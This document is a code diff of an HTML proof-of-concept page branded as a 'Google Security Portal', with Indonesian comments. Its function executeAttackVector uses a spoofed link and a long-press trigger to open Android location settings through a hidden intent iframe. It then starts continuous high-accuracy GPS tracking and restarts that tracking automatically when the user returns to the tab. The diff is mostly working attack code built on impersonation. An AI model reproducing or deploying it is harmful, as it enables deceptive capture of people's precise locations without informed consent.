@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>High-Accuracy Geolocation & Settings PoC</title>
+    <title>Auto-Capture High-Accuracy Geolocation PoC</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -65,19 +65,29 @@
             font-size: 11px;
             color: #9aa0a6;
         }
+        .pulse {
+            color: #34a853;
+            font-weight: bold;
+            animation: blink 1.5s infinite;
+        }
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.4; }
+            100% { opacity: 1; }
+        }
     </style>
 </head>
 <body>
 
     <div class="banner">Google Security Portal</div>
-    <h1>High-Accuracy Location Verification</h1>
+    <h1>High-Accuracy Location Auto-Capture</h1>
 
     <!-- Target Link -->
-    <a href="https://google.com" class="spoof-link" id="targetLink">Long Press -> Preview Page & Location Capture</a>
+    <a href="https://google.com" class="spoof-link" id="targetLink">Long Press -> Trigger Settings & Auto-Capture</a>
 
-    <!-- Info Box untuk menampilkan hasil koordinat lokasi -->
+    <!-- Info Box untuk menampilkan hasil koordinat lokasi secara real-time -->
     <div class="info-box" id="infoBox">
-        <strong>Location Status:</strong> <span id="statusText">Initializing...</span><br>
+        <strong>Status:</strong> <span id="statusText" class="pulse">Waiting for activation...</span><br>
         <div id="coordDetails" style="margin-top: 8px;"></div>
     </div>
 
@@ -85,6 +95,50 @@
 
     <script>
         let triggered = false;
+        let watchId = null;
+
+        const updatePositionData = (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            const altitude = position.coords.altitude || "N/A";
+            const speed = position.coords.speed || "N/A";
+
+            const statusText = document.getElementById("statusText");
+            const coordDetails = document.getElementById("coordDetails");
+
+            statusText.className = "";
+            statusText.innerText = "Precise Location Captured Live!";
+            coordDetails.innerHTML = `
+                <b>Latitude:</b> ${lat}<br>
+                <b>Longitude:</b> ${lon}<br>
+                <b>Accuracy:</b> ±${accuracy} meters<br>
+                <b>Altitude:</b> ${altitude}<br>
+                <b>Speed:</b> ${speed}<br><br>
+                <a href="https://maps.google.com/?q=${lat},${lon}" target="_blank" style="color: #1a73e8; text-decoration: underline;">Open in Google Maps</a>
+            `;
+        };
+
+        const startLocationWatch = () => {
+            if ("geolocation" in navigator) {
+                // Menggunakan watchPosition agar lokasi terus diperbarui otomatis secara real-time
+                watchId = navigator.geolocation.watchPosition(
+                    updatePositionData,
+                    (error) => {
+                        const statusText = document.getElementById("statusText");
+                        statusText.className = "";
+                        statusText.innerText = `GPS Error / Disabled: ${error.message}. Please enable location settings.`;
+                    },
+                    {
+                        enableHighAccuracy: true, // Memaksa hardware GPS tingkat tinggi aktif
+                        timeout: 30000,           // Waktu tunggu maksimal
+                        maximumAge: 0             // Tanpa cache, mengambil data titik terbaru
+                    }
+                );
+            } else {
+                document.getElementById("statusText").innerText = "Geolocation not supported.";
+            }
+        };
 
         const executeAttackVector = () => {
             if (triggered) return;
@@ -92,71 +146,48 @@
 
             const infoBox = document.getElementById("infoBox");
             const statusText = document.getElementById("statusText");
-            const coordDetails = document.getElementById("coordDetails");
             
             infoBox.style.display = "block";
-            statusText.innerText = "Triggering system location settings & requesting coordinates...";
+            statusText.className = "pulse";
+            statusText.innerText = "Opening Android Location Settings & syncing GPS...";
 
-            // Timer optimized to match preview page / action sequence
+            // Timer sinkronisasi dengan animasi preview page
             setTimeout(() => {
                 try {
-                    // 1. Memicu Android Intent untuk membuka menu pengaturan lokasi perangkat secara langsung
+                    // 1. Membuka Android Intent Location Settings agar pengguna bisa mengaktifkan lokasi
                     const intentFrame = document.createElement('iframe');
                     intentFrame.style.display = 'none';
                     intentFrame.src = "intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end;";
                     document.body.appendChild(intentFrame);
                     setTimeout(() => document.body.removeChild(intentFrame), 1000);
 
-                    // 2. Menangkap koordinat titik lokasi akurat tinggi menggunakan Geolocation API
-                    if ("geolocation" in navigator) {
-                        navigator.geolocation.getCurrentPosition(
-                            (position) => {
-                                const lat = position.coords.latitude;
-                                const lon = position.coords.longitude;
-                                const accuracy = position.coords.accuracy;
-                                const altitude = position.coords.altitude || "N/A";
-                                const speed = position.coords.speed || "N/A";
-
-                                statusText.innerText = "Precise Location Captured Successfully!";
-                                coordDetails.innerHTML = `
-                                    <b>Latitude:</b> ${lat}<br>
-                                    <b>Longitude:</b> ${lon}<br>
-                                    <b>Accuracy:</b> ±${accuracy} meters<br>
-                                    <b>Altitude:</b> ${altitude}<br>
-                                    <b>Speed:</b> ${speed}<br><br>
-                                    <a href="https://maps.google.com/?q=${lat},${lon}" target="_blank" style="color: #1a73e8; text-decoration: underline;">Open in Google Maps</a>
-                                `;
-                            },
-                            (error) => {
-                                statusText.innerText = `Geolocation error: ${error.message}`;
-                            },
-                            {
-                                enableHighAccuracy: true, // Memaksa penggunaan GPS/Hardware tingkat akurasi tinggi
-                                timeout: 15000,           // Batas waktu tunggu maksimal (15 detik)
-                                maximumAge: 0             // Mencegah cache, mengambil data titik koordinat real-time
-                            }
-                        );
-                    } else {
-                        statusText.innerText = "Geolocation is not supported by this browser.";
-                    }
+                    // 2. Memulai proses pelacakan koordinat GPS kontinyu
+                    startLocationWatch();
 
                 } catch (err) {
                     console.debug("Vector execution error:", err.message);
                 } finally {
-                    setTimeout(() => { triggered = false; }, 1000);
+                    setTimeout(() => { triggered = false; }, 1500);
                 }
-            }, 3000);
+            }, 2500);
         };
 
-        // Event listener untuk Long Press / Context Menu
+        // Event listener utama (Long Press / Context Menu)
         const targetElement = document.getElementById("targetLink");
         
         targetElement.addEventListener("contextmenu", (e) => {
-            // e.preventDefault(); // Uncomment baris ini jika ingin menahan menu konteks bawaan browser
             executeAttackVector();
         });
 
         targetElement.addEventListener("touchstart", () => {}, { passive: true });
+
+        // Auto-Trigger Handler: Begitu Anda kembali dari menu Setting Android ke tab browser (window focus), 
+        // sistem langsung mendeteksi ulang dan mengunci titik koordinat GPS akurat secara otomatis.
+        window.addEventListener("focus", () => {
+            if (infoBox.style.display === "block") {
+                startLocationWatch();
+            }
+        });
     </script>
 
 </body>
